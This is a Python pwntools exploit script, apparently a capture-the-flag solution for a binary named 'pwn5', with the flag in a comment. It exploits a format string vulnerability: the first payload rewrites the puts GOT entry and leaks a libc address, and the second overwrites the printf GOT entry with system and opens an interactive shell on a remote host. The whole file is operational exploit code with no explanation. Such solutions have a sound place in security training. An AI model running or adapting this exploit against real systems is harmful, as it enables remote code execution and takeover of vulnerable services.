#!/usr/bin/env python
from pwn import *
import time

# EOF{E4sy_fmt_str}

e , l = ELF('./pwn5') , ELF( 'libc-2.27.so' )

context.arch = 'amd64'
host , port = '10.140.0.8' , 11115
y = remote( host , port )


p = ('%{}c%10$hnAB%11$sCD'.format( 0x05e7 ) ).ljust( 0x20 , '\x00' ) + p64( e.got[ 'puts' ] ) + p64( 0x600ff0 )

y.sendline( p + 'a' * 3000 )

y.recvuntil( 'AB' )
l.address = u64( y.recv(6) + '\x00\x00' ) - l.sym.__libc_start_main
success( 'libc -> %s' % hex( l.address ) )

one = l.address + 0x10a38c
one = l.sym.system
print hex( one )

a = one & 0xffff
b = ( one >> 16 ) & 0xffff
c = ( one >> 32 ) & 0xffff

print hex( a ) , hex( b ) , hex( c )

got = e.got[ 'printf' ]

if b > a:  
    p = ('%{}c%10$hn%{}c%11$hn'.format( a , b - a ) ).ljust( 0x20 , '\x00' ) + p64( got ) + p64( got + 2 )
    y.sendline( p + 'a' * 3000 )
    y.interactive()
else:
    p = ('%{}c%10$hn%{}c%11$hn'.format( b , a - b ) ).ljust( 0x20 , '\x00' ) + p64( got + 2 ) + p64( got )
    y.sendline( p + 'a' * 3000 )
    y.interactive()
